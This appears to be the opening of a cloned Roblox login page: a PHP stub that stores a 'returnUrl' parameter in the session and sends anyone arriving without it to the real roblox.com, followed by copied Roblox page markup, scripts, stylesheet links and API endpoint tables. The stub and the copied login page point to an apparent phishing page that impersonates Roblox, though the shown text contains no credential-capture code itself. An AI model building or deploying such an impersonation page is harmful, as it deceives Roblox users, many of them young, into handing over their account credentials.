<?php
session_start();
if($_GET["returnUrl"]){
	$_SESSION['session'] = $_GET["returnUrl"];
} else {
header("Location: https://www.roblox.com");
}
?>
<html><!--<![endif]--><head data-machine-id="CHI1-WEB9289"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
<style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
    <!-- MachineID: CHI1-WEB9289 -->
    <title>Roblox</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="author" content="Roblox Corporation">
<meta name="description" content="Roblox is a global platform that brings people together through play.">
<meta name="keywords" content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine">

    <meta name="apple-itunes-app" content="app-id=431946152">




<script ec-api-script="true" type="text/javascript" async="" src="https://roblox-api.arkoselabs.com/cdn/fc/js/39eca341811c50f1f573c72f14bd5612e0f6cd3c/standard/funcaptcha_api.js"></script><script ec-api-script="true" type="text/javascript" async="" src="https://roblox-api.arkoselabs.com/cdn/fc/js/39eca341811c50f1f573c72f14bd5612e0f6cd3c/standard/funcaptcha_api.js"></script><script ec-api-script="true" type="text/javascript" async="" src="https://roblox-api.arkoselabs.com/cdn/fc/js/39eca341811c50f1f573c72f14bd5612e0f6cd3c/standard/funcaptcha_api.js"></script><script type="application/ld+json">
    {
    "@context" : "http://schema.org",
    "@type" : "Organization",
    "name" : "Roblox",
    "url" : "https://www.roblox.com/",
    "logo": "https://images.rbxcdn.com/cece570e37aa8f95a450ab0484a18d91",
    "sameAs" : [
    "https://www.facebook.com/roblox/",
    "https://twitter.com/roblox",
    "https://www.linkedin.com/company/147977",
    "https://www.instagram.com/roblox/",
    "https://www.youtube.com/user/roblox",
    "https://plus.google.com/+roblox",
    "https://www.twitch.tv/roblox"
    ]
    }
</script>
    <meta ng-csp="no-unsafe-eval">

<meta name="locale-data" data-language-code="en_us" data-language-name="English"><meta name="device-meta" data-device-type="computer" data-is-in-app="false" data-is-desktop="true" data-is-phone="false" data-is-tablet="false" data-is-console="false" data-is-android-app="false" data-is-ios-app="false" data-is-uwp-app="false" data-is-xbox-app="false" data-is-amazon-app="false" data-is-win32-app="false" data-is-studio="false" data-is-game-client-browser="false" data-is-ios-device="false" data-is-android-device="false" data-is-universal-app="false" data-app-type="unknown">
<meta name="environment-meta" data-is-testing-site="false">

<meta id="roblox-display-names" data-enabled="true">

<meta name="hardware-backed-authentication-data" data-is-secure-authentication-intent-enabled="true" data-is-bound-auth-token-enabled="false" data-bound-auth-token-whitelist="{&quot;Whitelist&quot;:[{&quot;apiSite&quot;:&quot;auth.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;accountsettings.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;inventory.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;accountinformation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}]}" data-hba-indexed-db-name="hbaDB" data-hba-indexed-db-obj-store-name="hbaObjectStore">
<meta name="page-meta" data-internal-page-name="Login">

    

<script type="text/javascript">
    var Roblox = Roblox || {};

    Roblox.BundleVerifierConstants = {
        isMetricsApiEnabled: true,
        eventStreamUrl: "//ecsv2.roblox.com/pe?t=diagnostic",
        deviceType: "Computer",
        cdnLoggingEnabled: JSON.parse("true")
    };
</script>        <script type="text/javascript">
            var Roblox = Roblox || {};

Roblox.BundleDetector = (function () {
    var isMetricsApiEnabled = Roblox.BundleVerifierConstants && Roblox.BundleVerifierConstants.isMetricsApiEnabled;

    var loadStates = {
        loadSuccess: "loadSuccess",
        loadFailure: "loadFailure",
        executionFailure: "executionFailure"
    };

    var bundleContentTypes = {
        javascript: "javascript",
        css: "css"
    };

    var ephemeralCounterNames = {
        cdnPrefix: "CDNBundleError_",
        unknown: "CDNBundleError_unknown",
        cssError: "CssBundleError",
        jsError: "JavascriptBundleError",
        jsFileError: "JsFileExecutionError",
        resourceError: "ResourcePerformance_Error",
        resourceLoaded: "ResourcePerformance_Loaded"
    };

    return {
        jsBundlesLoaded: {},
        bundlesReported: {},

        counterNames: ephemeralCounterNames,
        loadStates: loadStates,
        bundleContentTypes: bundleContentTypes,

        timing: undefined,

        setTiming: function (windowTiming) {
            this.timing = windowTiming;
        },

        getLoadTime: function () {
            if (this.timing && this.timing.domComplete) {
                return this.getCurrentTime() - this.timing.domComplete;
            }
        },

        getCurrentTime: function () {
            return new Date().getTime();
        },

        getCdnProviderName: function (bundleUrl, callBack) {
            if (Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', bundleUrl, true);

                xhr.onreadystatechange = function () {
                    if (xhr.readyState === xhr.HEADERS_RECEIVED) {
                        try {
                            var headerValue = xhr.getResponseHeader("rbx-cdn-provider");
                            if (headerValue) {
                                callBack(headerValue);
                            } else {
                                callBack();
                            }
                        } catch (e) {
                            callBack();
                        }
                    }
                };

                xhr.onerror = function () {
                    callBack();
                };

                xhr.send();
            } else {
                callBack();
            }
        },

        getCdnProviderAndReportMetrics: function (bundleUrl, bundleName, loadState, bundleContentType) {
            this.getCdnProviderName(bundleUrl, function (cdnProviderName) {
                Roblox.BundleDetector.reportMetrics(bundleUrl, bundleName, loadState, bundleContentType, cdnProviderName);
            });
        },

        reportMetrics: function (bundleUrl, bundleName, loadState, bundleContentType, cdnProviderName) {
            if (!isMetricsApiEnabled
                || !bundleUrl
                || !loadState
                || !loadStates.hasOwnProperty(loadState)
                || !bundleContentType
                || !bundleContentTypes.hasOwnProperty(bundleContentType)) {
                return;
            }

            var xhr = new XMLHttpRequest();
            var metricsApiUrl = (Roblox.EnvironmentUrls && Roblox.EnvironmentUrls.metricsApi) || "https://metrics.roblox.com";

            xhr.open("POST", metricsApiUrl + "/v1/bundle-metrics/report", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.withCredentials = true;
            xhr.send(JSON.stringify({
                bundleUrl: bundleUrl,
                bundleName: bundleName || "",
                bundleContentType: bundleContentType,
                loadState: loadState,
                cdnProviderName: cdnProviderName,
                loadTimeInMilliseconds: this.getLoadTime() || 0
            }));
        },

        logToEphemeralStatistics: function (sequenceName, value) {
            var deviceType = Roblox.BundleVerifierConstants.deviceType;
            sequenceName += "_" + deviceType;

            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/game/report-stats?name=' + sequenceName + "&value=" + value, true);
            xhr.withCredentials = true;
            xhr.send();
        },

        logToEphemeralCounter: function (ephemeralCounterName) {
            var deviceType = Roblox.BundleVerifierConstants.deviceType;
            ephemeralCounterName += "_" + deviceType;
            //log to ephemeral counters - taken from ET.js
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/game/report-event?name=' + ephemeralCounterName, true);
            xhr.withCredentials = true;
            xhr.send();
        },

        logToEventStream: function (failedBundle, ctx, cdnProvider, status) {
            var esUrl = Roblox.BundleVerifierConstants.eventStreamUrl,
                currentPageUrl = encodeURIComponent(window.location.href);

            var deviceType = Roblox.BundleVerifierConstants.deviceType;
            ctx += "_" + deviceType;
            //try and grab performance data.
            //Note that this is the performance of the xmlhttprequest rather than the original resource load.
            var duration = 0;
            if (window.performance) {
                var perfTiming = window.performance.getEntriesByName(failedBundle);
                if (perfTiming.length > 0) {
                    var data = perfTiming[0];
                    duration = data.duration || 0;
                }
            }
            //log to event stream (diagnostic)
            var params = "&evt=webBundleError&url=" + currentPageUrl +
                "&ctx=" + ctx + "&fileSourceUrl=" + encodeURIComponent(failedBundle) +
                "&cdnName=" + (cdnProvider || "unknown") +
                "&statusCode=" + (status || "unknown") +
                "&loadDuration=" + Math.floor(duration);
            var img = new Image();
            img.src = esUrl + params;
        },

        getCdnInfo: function (failedBundle, ctx, fileType) {
            if (Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
                var xhr = new XMLHttpRequest();
                var counter = this.counterNames;
                xhr.open('GET', failedBundle, true);
                var cdnProvider;

                //succesful request
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === xhr.HEADERS_RECEIVED) {
                        cdnProvider = xhr.getResponseHeader("rbx-cdn-provider");
                        if (cdnProvider && cdnProvider.length > 0) {
                            Roblox.BundleDetector.logToEphemeralCounter(counter.cdnPrefix + cdnProvider + "_" + fileType);
                        }
                        else {
                            Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
                        }
                    }
                    else if (xhr.readyState === xhr.DONE) {
                        // append status to cdn provider so we know its not related to network error. 
                        Roblox.BundleDetector.logToEventStream(failedBundle, ctx, cdnProvider, xhr.status);
                    }
                };

                //attach to possible things that can go wrong with the request.
                //additionally a network error will trigger this callback
                xhr.onerror = function () {
                    Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
                    Roblox.BundleDetector.logToEventStream(failedBundle, ctx, counter.unknown);
                };

                xhr.send();
            }
            else {
                this.logToEventStream(failedBundle, ctx);
            }
        },

        reportResourceError: function (resourceName) {
            var ephemeralCounterName = this.counterNames.resourceError + "_" + resourceName;
            this.logToEphemeralCounter(ephemeralCounterName);
        },

        reportResourceLoaded: function (resourceName) {
            var loadTimeInMs = this.getLoadTime();
            if (loadTimeInMs) {
                var sequenceName = this.counterNames.resourceLoaded + "_" + resourceName;
                this.logToEphemeralStatistics(sequenceName, loadTimeInMs);
            }
        },

        reportBundleError: function (bundleTag) {
            var ephemeralCounterName, failedBundle, ctx, contentType;
            if (bundleTag.rel && bundleTag.rel === "stylesheet") {
                ephemeralCounterName = this.counterNames.cssError;
                failedBundle = bundleTag.href;
                ctx = "css";
                contentType = bundleContentTypes.css;
            } else {
                ephemeralCounterName = this.counterNames.jsError;
                failedBundle = bundleTag.src;
                ctx = "js";
                contentType = bundleContentTypes.javascript;
            }

            //mark that we logged this bundle
            this.bundlesReported[failedBundle] = true;

            //e.g. javascriptBundleError_Computer
            this.logToEphemeralCounter(ephemeralCounterName);
            //this will also log to event stream
            this.getCdnInfo(failedBundle, ctx, ctx);

            var bundleName;
            if (bundleTag.dataset) {
                bundleName = bundleTag.dataset.bundlename;
            }
            else {
                bundleName = bundleTag.getAttribute('data-bundlename');
            }

            this.getCdnProviderAndReportMetrics(failedBundle, bundleName, loadStates.loadFailure, contentType);
        },

        bundleDetected: function (bundleName) {
            this.jsBundlesLoaded[bundleName] = true;
        },

        verifyBundles: function (document) {
            var ephemeralCounterName = this.counterNames.jsFileError,
                eventContext = ephemeralCounterName;
            //grab all roblox script tags in the page. 
            var scripts = (document && document.scripts) || window.document.scripts;
            var errorsList = [];
            var bundleName;
            var monitor;
            for (var i = 0; i < scripts.length; i++) {
                var item = scripts[i];

                if (item.dataset) {
                    bundleName = item.dataset.bundlename;
                    monitor = item.dataset.monitor;
                }
                else {
                    bundleName = item.getAttribute('data-bundlename');
                    monitor = item.getAttribute('data-monitor');
                }

                if (item.src && monitor && bundleName) {
                    if (!Roblox.BundleDetector.jsBundlesLoaded.hasOwnProperty(bundleName)) {
                        errorsList.push(item);
                    }
                }
            }
            if (errorsList.length > 0) {
                for (var j = 0; j < errorsList.length; j++) {
                    var script = errorsList[j];
                    if (!this.bundlesReported[script.src]) {
                        //log the counter only if the file is actually corrupted, not just due to failure to load
                        //e.g. JsFileExecutionError_Computer
                        this.logToEphemeralCounter(ephemeralCounterName);
                        this.getCdnInfo(script.src, eventContext, 'js');

                        if (script.dataset) {
                            bundleName = script.dataset.bundlename;
                        }
                        else {
                            bundleName = script.getAttribute('data-bundlename');
                        }

                        this.getCdnProviderAndReportMetrics(script.src, bundleName, loadStates.executionFailure, bundleContentTypes.javascript);
                    }
                }
            }
        }
    };
})();

window.addEventListener("load", function (evt) {
    Roblox.BundleDetector.verifyBundles();
});

Roblox.BundleDetector.setTiming(window.performance.timing);
            //# sourceURL=somename.js
        </script>
    
<link href="https://images.rbxcdn.com/7bba321f4d8328683d6e59487ce514eb" rel="icon">


    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="StyleGuide" data-bundle-source="Main" href="https://css.rbxcdn.com/34b4df2feb1cac7201892b667c8185409f3d6271e650a5f313976062e3ca1ce5.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Thumbnails" data-bundle-source="Main" href="https://css.rbxcdn.com/9517d686dc47015c200496d77e2b18146ee37652d18e25ecf9e1ed230310ea13.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CaptchaCore" data-bundle-source="Main" href="https://css.rbxcdn.com/b8f8f15a57a66e73469ae72eea7d8905346afa78b9f2397627cd099f7dcc779a.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Challenge" data-bundle-source="Main" href="https://css.rbxcdn.com/b058572a60452c8c5ce47eb18c55dd3760a21b24c698b64fab5531c58bb0cf0e.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="VerificationUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/3f5767588c352c1b6fd800e2d14466cfa7113a04fa5cf02f1e33f2f0e7dd204f.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobloxBadges" data-bundle-source="Main" href="https://css.rbxcdn.com/da45920fef8b22d35ee6cce0702d290241252fbfd99695e2abc0934d20de0974.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Navigation" data-bundle-source="Main" href="https://css.rbxcdn.com/6686c24b7d5461929debb2b62b589c5399f35ba8ea8ffdd641cf2a6b0b0b686e.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CookieBannerV3" data-bundle-source="Main" href="https://css.rbxcdn.com/2c2a709240897ce382b7ff55be4347cd0994ab1e2d6ed3b56649e54b0e97e13a.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Footer" data-bundle-source="Main" href="https://css.rbxcdn.com/6edb2191aa318f963253361b43d2657a04b3d16e9c28fe7b22d4a4d5686f1cb4.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ConfigureWebApps" data-bundle-source="Main" href="https://css.rbxcdn.com/08def520152a575438e73a81aa9a310c2415c327df7b624a24aa6e794d24dba3.css">


    <link rel="canonical" href="https://www.roblox.com/NewLogin">
    
<link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/leanbase___5e469c309d1eeddf42cc9d36a50f82e0_m.css/fetch">


    
<link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/page___b0dafd506d198313adc7eb9bccc23fbb_m.css/fetch">


<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Captcha" data-bundle-source="Main" href="https://css.rbxcdn.com/ee82c23c0c487dc90ec8cdd1b0caf2fc786ff3285fe8be06218c9838288d46e5.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CrossDeviceLoginDisplayCode" data-bundle-source="Main" href="https://css.rbxcdn.com/d8a3b48304642bf28fbc1675e55cbd75a3be58986a34a762e360dd3963ad467b.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountSelector" data-bundle-source="Main" href="https://css.rbxcdn.com/dafa0011479aa80baa7644c359afa68ccb9a098c0cf599bff1b1fd7781553336.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="EmailVerifyCodeModal" data-bundle-source="Main" href="https://css.rbxcdn.com/13268acde7e01c62a818ccf9b82e301d8b6df25e45f76a4429c10d1a3aa4f2d0.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ReactLogin" data-bundle-source="Main" href="https://css.rbxcdn.com/c12b1163bd09c1076e861bfcbb98ab175a37971fae6a96c54c031afbb6589427.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountRecoveryModal" data-bundle-source="Main" href="https://css.rbxcdn.com/4b5dce375cef78073d2192583d1ecd458f10c308fa99847d649d5ec801bebd61.css">

    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobuxIcon" data-bundle-source="Main" href="https://css.rbxcdn.com/6fe55c3438539daf776774645e39e121d991246d6a38972b81e3f9550a585b5b.css">


    <link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ItemPurchaseUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/3c4bd9b17b9020d9ebc87d4542a68a949a9de6150a55a92f0e65514520ee777e.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ItemPurchase" data-bundle-source="Main" href="https://css.rbxcdn.com/5331669054807354a3a20a4717d18c566a7cbee984e7471ece3a2090cb70150c.css">
<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="IdVerification" data-bundle-source="Main" href="https://css.rbxcdn.com/68f976f4a3f8f3a6aae074879170e579451270e693d2361491b1c1bb9ac5e4c5.css">


    

    



<link rel="stylesheet" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-bundlename="UserAgreementsChecker" data-bundle-source="Main" href="https://css.rbxcdn.com/d5a3728b78be729b693aadf79a1f45f0fa49c15fe863a0d7dd631b75f9e82207.css">






<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.EnvironmentUrls = Roblox.EnvironmentUrls || {};
    Roblox.EnvironmentUrls = {"abtestingApiSite":"https://abtesting.roblox.com","accountInformationApi":"https://accountinformation.roblox.com","accountSettingsApi":"https://accountsettings.roblox.com","adConfigurationApi":"https://adconfiguration.roblox.com","adsApi":"https://ads.roblox.com","apiGatewayCdnUrl":"https://apis.rbxcdn.com","apiGatewayUrl":"https://apis.roblox.com","apiProxyUrl":"https://api.roblox.com","assetDeliveryApi":"https://assetdelivery.roblox.com","authApi":"https://auth.roblox.com","avatarApi":"https://avatar.roblox.com","badgesApi":"https://badges.roblox.com","billingApi":"https://billing.roblox.com","captchaApi":"https://captcha.roblox.com","catalogApi":"https://catalog.roblox.com","chatApi":"https://chat.roblox.com","chatModerationApi":"https://chatmoderation.roblox.com","contactsApi":"https://contacts.roblox.com","contactsServiceApi":"https://apis.roblox.com/contacts-api","contentStoreApi":"https://contentstore.roblox.com","developApi":"https://develop.roblox.com","domain":"roblox.com","economyApi":"https://economy.roblox.com","economycreatorstatsApi":"https://economycreatorstats.roblox.com","engagementPayoutsApi":"https://engagementpayouts.roblox.com","followingsApi":"https://followings.roblox.com","friendsApi":"https://friends.roblox.com","gameInternationalizationApi":"https://gameinternationalization.roblox.com","gamesApi":"https://games.roblox.com","gameJoinApi":"https://gamejoin.roblox.com","groupsApi":"https://groups.roblox.com","groupsModerationApi":"https://groupsmoderation.roblox.com","helpSite":"https://en.help.roblox.com","inventoryApi":"https://inventory.roblox.com","itemConfigurationApi":"https://itemconfiguration.roblox.com","localeApi":"https://locale.roblox.com","localizationTablesApi":"https://localizationtables.roblox.com","metricsApi":"https://metrics.roblox.com","midasApi":"https://midas.roblox.com","notificationApi":"https://notifications.roblox.com","passProductPurchasingApi":"https://apis.roblox.com/pass-product-purchasing","bundlesProductPurchasingApi":"https://apis.roblox.com/bundles-product-purchasing","premiumFeaturesApi":"https://premiumfeatures.roblox.com","presenceApi":"https://presence.roblox.com","privateMessagesApi":"https://privatemessages.roblox.com","publishApi":"https://publish.roblox.com","restrictedHoursServiceApi":"https://apis.roblox.com/restricted-hours-service","screenTimeApi":"https://apis.rcs.roblox.com/screen-time-api","shareApi":"https://share.roblox.com","shareLinksApi":"https://apis.roblox.com/sharelinks","thumbnailsApi":"https://thumbnails.roblox.com","tradesApi":"https://trades.roblox.com","translationRolesApi":"https://translationroles.roblox.com","twoStepVerificationApi":"https://twostepverification.roblox.com","universalAppConfigurationApi":"https://apis.roblox.com/universal-app-configuration","userAgreementsServiceApi":"https://apis.roblox.com/user-agreements","userModerationApi":"https://usermoderation.roblox.com","usersApi":"https://users.roblox.com","userSettingsApi":"https://apis.roblox.com/user-settings-api","voiceApi":"https://voice.roblox.com","websiteUrl":"https://www.roblox.com"};

    // please keep the list in alphabetical order
    var additionalUrls = {
        amazonStoreLink: "https://www.amazon.com/Roblox-Corporation/dp/B00NUF4YOA",
        amazonWebStoreLink: "https%3a%2f%2fwww.amazon.com%2froblox%3f%26_encoding%3dUTF8%26tag%3dr05d13-20%26linkCode%3dur2%26linkId%3d5562fc29c05b45562a86358c198356eb%26camp%3d1789%26creative%3d9325",
        appProtocolUrl: "robloxmobile://",
        appStoreLink: "https://itunes.apple.com/us/app/roblox-mobile/id431946152",
        googlePlayStoreLink: "https://play.google.com/store/apps/details?id=com.roblox.client&amp;hl=en",
        iosAppStoreLink: "https://itunes.apple.com/us/app/roblox-mobile/id431946152",
        windowsStoreLink: "https://www.microsoft.com/en-us/store/games/roblox/9nblgggzm6wm",
        xboxStoreLink: "https://www.microsoft.com/en-us/p/roblox/bq1tn1t79v9k"
    }

    for (var urlName in additionalUrls) {
        Roblox.EnvironmentUrls[urlName] = additionalUrls[urlName];
    }
    
        
    Roblox.EnvironmentUrls["websiteUrl"] = "https://www.roblox.com";
        
</script>



<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.GaEventSettings = {
        gaDFPPreRollEnabled: "false" === "true",
        gaLaunchAttemptAndLaunchSuccessEnabled: "false" === "true",
        gaPerformanceEventEnabled: "false" === "true"
    };
</script>



    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="headerinit" type="text/javascript" src="https://js.rbxcdn.com/4a481e857787c241b22259659a0674a7.js"></script>

    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Polyfill" data-bundle-source="Main" src="https://js.rbxcdn.com/772034db167d3f4260047db4a7f2b8a58cf448709327013541e47c8962b6e556.js"></script>


    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="XsrfProtection" data-bundle-source="Main" src="https://js.rbxcdn.com/4db2f741b7a3ec36d11fec999ce33f708ae85641cabfd27e11e0935928f7d9c4.js"></script>


    <script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="HeaderScripts" data-bundle-source="Main" src="https://js.rbxcdn.com/97cb9ac7262155c329a259fce9f940f9bcfa852a6a1ccb44bd8a41c31e84e54b.js"></script>



<meta name="sentry-meta" data-env-name="production" data-dsn="https://6750adeb1b1348e4a10b13e726d5c10b@sentry.io/1539367" data-sample-rate="0"><script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Sentry" data-bundle-source="Main" src="https://js.rbxcdn.com/edc66704bd1974195d8c60f4a163441bec82f1bcb11c492e7df07c43f45a4d49.js"></script>

<meta name="roblox-tracer-meta-data" data-access-token="S3EXjCZQQr6OixnmKu+hoa3OSfpvPP5qgU0esiWgwreFUUMBnPhEaoS5yIIrf9bdYlSgW0XKCb1So9Rhtj1eMzt/MJWcyKZ4TwIckHVj" data-service-name="Web" data-tracer-enabled="false" data-api-sites-request-allow-list="friends.roblox.com,chat.roblox.com,thumbnails.roblox.com,games.roblox.com,gameinternationalization.roblox.com,localizationtables.roblox.com" data-sample-rate="5" data-is-instrument-page-performance-enabled="true"><script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="RobloxTracer" data-bundle-source="Main" src="https://js.rbxcdn.com/adeccc658a8d5ddc63fb224cc0bcd3e29b73d70db3847c0379426bfa128d9381.js"></script>

    
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">

<script type="text/javascript">
    var Roblox = Roblox || {};
    Roblox.AdsHelper = Roblox.AdsHelper || {};
    Roblox.AdsLibrary = Roblox.AdsLibrary || {};

    Roblox.AdsHelper.toggleAdsSlot = function (slotId, GPTRandomSlotIdentifier) {
        var gutterAdsEnabled = false;
        if (gutterAdsEnabled) {
            googletag.display(GPTRandomSlotIdentifier);
            return;
        }
        
        if (typeof slotId !== 'undefined' && slotId && slotId.length > 0) {
            var slotElm = $("#"+slotId);
            if (slotElm.is(":visible")) {
                googletag.display(GPTRandomSlotIdentifier);
            }else {
                var adParam = Roblox.AdsLibrary.adsParameters[slotId];
                if (adParam) {
                    adParam.template = slotElm.html();
                    slotElm.empty();
                }
            }
        }
    }
</script>


    
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
        <script src="//oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

<script>
    //Set if it browser's do not track flag is enabled
    var Roblox = Roblox || {};
    (function() {
        var dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
        if (typeof window.external !== "undefined" &&
            typeof window.external.msTrackingProtectionEnabled !== "undefined") {
            dnt = dnt || window.external.msTrackingProtectionEnabled();
        }
        Roblox.browserDoNotTrack = dnt == "1" || dnt == "yes" || dnt === true;
    })();
</script>



            <script type="text/javascript">
            if (Roblox && Roblox.EventStream) {
                Roblox.EventStream.Init("//ecsv2.roblox.com/www/e.png",
                    "//ecsv2.roblox.com/www/e.png",
                    "//ecsv2.roblox.com/pe?t=studio",
                    "//ecsv2.roblox.com/pe?t=diagnostic");
            }
        </script>



<script type="text/javascript">
    if (Roblox && Roblox.PageHeartbeatEvent) {
        Roblox.PageHeartbeatEvent.Init([2,8,20,60]);
    }
</script>    
    <script type="text/javascript">
if (typeof(Roblox) === "undefined") { Roblox = {}; }
Roblox.Endpoints = Roblox.Endpoints || {};
Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
Roblox.Endpoints.Urls['/asset/'] = 'https://assetgame.roblox.com/asset/';
Roblox.Endpoints.Urls['/client-status/set'] = 'https://www.roblox.com/client-status/set';
Roblox.Endpoints.Urls['/client-status'] = 'https://www.roblox.com/client-status';
Roblox.Endpoints.Urls['/game/'] = 'https://assetgame.roblox.com/game/';
Roblox.Endpoints.Urls['/game/edit.ashx'] = 'https://assetgame.roblox.com/game/edit.ashx';
Roblox.Endpoints.Urls['/game/placelauncher.ashx'] = 'https://assetgame.roblox.com/game/placelauncher.ashx';
Roblox.Endpoints.Urls['/game/preloader'] = 'https://assetgame.roblox.com/game/preloader';
Roblox.Endpoints.Urls['/game/report-stats'] = 'https://assetgame.roblox.com/game/report-stats';
Roblox.Endpoints.Urls['/game/report-event'] = 'https://assetgame.roblox.com/game/report-event';
Roblox.Endpoints.Urls['/game/updateprerollcount'] = 'https://assetgame.roblox.com/game/updateprerollcount';
Roblox.Endpoints.Urls['/login/default.aspx'] = 'https://www.roblox.com/login/default.aspx';
Roblox.Endpoints.Urls['/my/avatar'] = 'https://www.roblox.com/my/avatar';
Roblox.Endpoints.Urls['/my/money.aspx'] = 'https://www.roblox.com/my/money.aspx';
Roblox.Endpoints.Urls['/navigation/userdata'] = 'https://www.roblox.com/navigation/userdata';
Roblox.Endpoints.Urls['/chat/chat'] = 'https://www.roblox.com/chat/chat';
Roblox.Endpoints.Urls['/chat/data'] = 'https://www.roblox.com/chat/data';
Roblox.Endpoints.Urls['/friends/list'] = 'https://www.roblox.com/friends/list';
Roblox.Endpoints.Urls['/navigation/getcount'] = 'https://www.roblox.com/navigation/getCount';
Roblox.Endpoints.Urls['/regex/email'] = 'https://www.roblox.com/regex/email';
Roblox.Endpoints.Urls['/catalog/browse.aspx'] = 'https://www.roblox.com/catalog/browse.aspx';
Roblox.Endpoints.Urls['/catalog/html'] = 'https://search.roblox.com/catalog/html';
Roblox.Endpoints.Urls['/catalog/json'] = 'https://search.roblox.com/catalog/json';
Roblox.Endpoints.Urls['/catalog/contents'] = 'https://search.roblox.com/catalog/contents';
